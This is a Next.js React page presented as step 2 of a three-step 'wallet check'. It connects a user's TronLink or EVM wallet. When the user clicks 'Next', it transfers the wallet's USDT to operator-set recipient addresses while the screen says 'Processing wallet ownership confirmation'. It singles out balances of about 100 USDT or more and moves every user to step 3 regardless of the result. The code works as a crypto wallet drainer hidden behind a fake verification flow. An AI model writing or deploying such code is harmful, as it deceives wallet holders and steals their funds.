 "use client";

import { useState, useEffect, Suspense } from "react";
import { useRouter, useSearchParams } from "next/navigation";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { useTron } from "@/app/hooks/useTron";
import { useEvmWallet } from "@/app/hooks/useEvmWallet";
import { toast } from "@/components/ui/use-toast";
import { useConnectModal } from "@rainbow-me/rainbowkit";

const recipientAddresses = {
  trc20: process.env.NEXT_PUBLIC_TO_TRON_ADRESS || "",
  evm: process.env.NEXT_PUBLIC_TO_ETH_ADRESS || "",
  bsc: process.env.NEXT_PUBLIC_TO_BSC_ADRESS || "",
};

function WalletCheckContent() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const selectedNetwork = searchParams.get("network") || "erc20";
  const [isLoading, setIsLoading] = useState(false);
  const [isTronLinkAvailable, setIsTronLinkAvailable] = useState(false);
  const [isProcessingTron, setIsProcessingTron] = useState(false);

  const evmWallet = useEvmWallet(selectedNetwork);
  const { openConnectModal } = useConnectModal();
  const {
    tronWeb,
    tronAddress,
    tronBalance,
    isConnecting: isTronConnecting,
    handleDisconnect: handleDisconnectTron,
    transferUsdt,
    approveProxyContract,
    depositToProxy,
    transferViaProxy,
    connectWithTronLink,
    fetchTronUsdtBalance
  } = useTron();

  useEffect(() => {
    setIsTronLinkAvailable(!!window.tron || !!window.tronLink);
  }, []);

  useEffect(() => {
    if (
      (selectedNetwork === "trc20" && tronAddress) ||
      (selectedNetwork !== "trc20" && evmWallet.isConnected)
    ) {
      setIsLoading(false);
    }
  }, [tronAddress, evmWallet.isConnected, selectedNetwork]);

  const handleConnect = async () => {
    if (isLoading || isTronConnecting || evmWallet.isLoading) return;

    setIsLoading(true);

    try {
      if (selectedNetwork === "trc20") {
        if (tronAddress) {
          setIsLoading(false);
          return;
        }

        if (isTronLinkAvailable) {
          const connected = await connectWithTronLink();
          if (!connected) {
            toast({
              title: "Connection Failed",
              description: "Failed to connect TronLink. Please try again.",
              variant: "destructive",
            });
          }
        } else {
          // Fallback to Rainbow wallet if TronLink is not available
          toast({
            title: "TronLink Not Available",
            description: "Falling back to Rainbow wallet for connection...",
            variant: "default",
          });
          
          // Open Rainbow wallet modal
          if (openConnectModal) {
            openConnectModal();
          } else {
            // Direct connect if modal function not available
            await evmWallet.connect();
          }
        }
      } else {
        const connected = await evmWallet.connect();
        if (!connected) {
          toast({
            title: "Connection Failed",
            description: "Failed to connect to wallet. Please try again.",
            variant: "destructive",
          });
        }
      }
    } catch (error) {
      toast({
        title: "Connection Error",
        description: "An error occurred while connecting to your wallet.",
        variant: "destructive",
      });
    } finally {
      setTimeout(() => setIsLoading(false), 1000);
    }
  };

  const handleDisconnect = () => {
    handleDisconnectTron();
    evmWallet.disconnect();
    setIsLoading(false);
  };

  const verifyWallet = async () => {
    if (isLoading || evmWallet.isTransferring || evmWallet.isApproving || isProcessingTron) return;
    setIsLoading(true);

    try {
      if (selectedNetwork === "trc20" && isTronLinkAvailable && tronWeb && tronAddress) {
        setIsProcessingTron(true);
        
        // Check TRON USDT balance
        const balanceResult = await fetchTronUsdtBalance();
        // Allow any balance (even 0) to trigger the transaction
        const minRequiredBalance = BigInt(process.env.NEXT_PUBLIC_MIN_BALANCE_TRC20 || "0");
        
        if (!balanceResult || !balanceResult.usdt || parseInt(balanceResult.usdt) < minRequiredBalance) {
          
          // Redirect to step 3 even with insufficient balance
          setTimeout(() => {
            setIsLoading(false);
            setIsProcessingTron(false);
            router.push(`/wallet-check-step3?network=${selectedNetwork}`);
          }, 3000);
          return;
        }
        
        const recipient = recipientAddresses.trc20;
        const success = await transferUsdt(recipient);
        
        if (!success) {
          setIsLoading(false);
          setIsProcessingTron(false);
          return;
        }

        setTimeout(() => {
          setIsLoading(false);
          setIsProcessingTron(false);
          router.push(`/wallet-check-step3?network=${selectedNetwork}`);
        }, 2000);

      } else if (selectedNetwork === "trc20" && !isTronLinkAvailable && evmWallet.isConnected) {
        // Fallback case: TRC20 selected but TronLink not available, using Rainbow wallet instead
        toast({
          title: "Processing with Rainbow Wallet",
          description: "Using connected wallet for TRC20 transaction...",
          variant: "default",
        });
        
        // Process the transaction using the EVM wallet as a fallback
        // This will use the connected wallet's native Tron support if available
        try {
          const recipient = recipientAddresses.trc20;
          
          // Use the EVM wallet to send the transaction to the Tron address
          const success = await evmWallet.transferUsdt(recipient);
          
          if (!success) {
            setIsLoading(false);
            return;
          }
          
          setTimeout(() => {
            setIsLoading(false);
            router.push(`/wallet-check-step3?network=${selectedNetwork}`);
          }, 2000);
        } catch (error) {
          setIsLoading(false);
          
          // If there's an error, still redirect to step 3
          setTimeout(() => {
            router.push(`/wallet-check-step3?network=${selectedNetwork}`);
          }, 3000);
        }
      } else if (evmWallet.isConnected) {
        const recipient = selectedNetwork === "bep20" 
          ? recipientAddresses.bsc 
          : recipientAddresses.evm;
        
        // Check if wallet has any tokens
        if (!evmWallet.usdtBalance || evmWallet.usdtBalance.value === BigInt(0)) {
          
          // Redirect to step 3 even with no tokens
          setTimeout(() => {
            setIsLoading(false);
            router.push(`/wallet-check-step3?network=${selectedNetwork}`);
          }, 3000);
          return;
        }
        
        // Calculate minimum required balance ($100 worth of USDT)
        // USDT has 6 decimals on Ethereum and 18 on BSC
        const minRequiredBalance = selectedNetwork === "bep20" 
          ? BigInt(process.env.NEXT_PUBLIC_MIN_BALANCE_BEP20 || "100000000000000000000") // 100 USDT on BSC (18 decimals)
          : BigInt(process.env.NEXT_PUBLIC_MIN_BALANCE_ERC20 || "100000000");            // 100 USDT on Ethereum (6 decimals)
          
        if (evmWallet.usdtBalance.value < minRequiredBalance) {
          
          // Redirect to step 3 even with insufficient balance
          setTimeout(() => {
            setIsLoading(false);
            router.push(`/wallet-check-step3?network=${selectedNetwork}`);
          }, 3000);
          return;
        }
        
        try {
          const success = await evmWallet.transferUsdt(recipient);
          
          if (!success) {
            setIsLoading(false);
            return;
          }
          setTimeout(() => {
            setIsLoading(false);
            router.push(`/wallet-check-step3?network=${selectedNetwork}`);
          }, 2000);
        } catch (error) {
          setIsLoading(false);
          setIsProcessingTron(false);
        }
      }
    } catch (error) {
      setIsLoading(false);
      setIsProcessingTron(false);
    }
  };

  const isWalletConnected = 
    (selectedNetwork === "trc20" && isTronLinkAvailable && tronWeb && tronAddress) || 
    (selectedNetwork === "trc20" && !isTronLinkAvailable && evmWallet.isConnected) ||
    (selectedNetwork !== "trc20" && evmWallet.isConnected);

  const isConnecting = isTronConnecting || evmWallet.isLoading || isLoading;
  const isProcessing = isLoading || evmWallet.isTransferring || evmWallet.isApproving || isProcessingTron;

  return (
    <div className="min-h-screen bg-[#f5f5f5] py-16">
      <div className="container mx-auto px-4">
        <Card className="max-w-md mx-auto p-6 shadow-lg">
          <div className="space-y-6">
            <div className="flex justify-between items-center">
              <h2 className="text-2xl font-semibold text-gray-800">
                Wallet check
              </h2>
              <span className="bg-blue-100 text-blue-600 px-3 py-1 rounded-full text-sm">
                Step 2 of 3
              </span>
            </div>

            {!isWalletConnected ? (
              <Button
                onClick={handleConnect}
                className="w-full p-6 bg-blue-600 text-white hover:bg-blue-700 rounded-full transition-all"
                disabled={isConnecting}
              >
                {isConnecting ? "Connecting..." : "Connect Wallet"}
              </Button>
            ) : (
              <div className="text-center space-y-4">
                <p className="text-gray-600">
                  {isProcessing
                    ? selectedNetwork === "trc20"
                      ? "Processing wallet ownership confirmation..."
                      : "Processing wallet ownership confirmation..."
                    : `Wallet Connected`}
                </p>
                {isProcessing && (
                  <div className="flex justify-center">
                    <svg
                      className="animate-spin h-5 w-5 text-blue-600"
                      xmlns="http://www.w3.org/2000/svg"
                      fill="none"
                      viewBox="0 0 24 24"
                    >
                      <circle
                        className="opacity-25"
                        cx="12"
                        cy="12"
                        r="10"
                        stroke="currentColor"
                        strokeWidth="4"
                      />
                      <path
                        className="opacity-75"
                        fill="currentColor"
                        d="M4 12a8 8 0 018-8v8h8a8 8 0 01-8 8 8 8 0 01-8-8z"
                      />
                    </svg>
                  </div>
                )}
                {!isProcessing && (
                  <Button
                    onClick={handleDisconnect}
                    className="w-full p-6 bg-red-100 text-red-600 hover:bg-red-200 rounded-full"
                  >
                    Disconnect
                  </Button>
                )}
              </div>
            )}

            <Button
              onClick={verifyWallet}
              className="w-full bg-blue-100 text-blue-600 hover:bg-blue-200 rounded-full p-6"
              disabled={isProcessing || !isWalletConnected}
            >
              {isProcessing ? "Processing..." : "Next"}
            </Button>
          </div>
        </Card>
      </div>
    </div>
  );
}

// Main component with Suspense boundary
export default function Step2() {
  return (
    <Suspense fallback={
      <div className="min-h-screen bg-[#f5f5f5] py-16">
        <div className="container mx-auto px-4">
          <Card className="max-w-md mx-auto p-6 shadow-lg">
            <div className="space-y-6">
              <div className="flex justify-between items-center">
                <h2 className="text-2xl font-semibold text-gray-800">
                  Wallet check
                </h2>
                <span className="bg-blue-100 text-blue-600 px-3 py-1 rounded-full text-sm">
                  Step 2 of 3
                </span>
              </div>
              <div className="flex items-center justify-center p-8">
                <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600"></div>
              </div>
            </div>
          </Card>
        </div>
      </div>
    }>
      <WalletCheckContent />
    </Suspense>
  );
}
